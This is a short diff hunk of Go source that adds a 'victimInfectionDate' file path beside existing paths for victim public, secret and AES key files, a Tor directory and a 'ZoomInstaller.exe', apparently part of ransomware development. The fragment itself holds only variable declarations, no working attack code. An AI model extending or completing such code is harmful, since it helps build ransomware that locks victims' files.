@@ -15,6 +15,7 @@ var (
     victimPublicKey      = workDir + `\b.flu`
     victimSecretKey      = workDir + `\c.flu`
     victimAESKey         = workDir + `\d.flu`
+    victimInfectionDate  = workDir + `\e.flu`
 
     torDirectory  = workDir + `\Tor`
     zoomInstaller = workDir + `\ZoomInstaller.exe`
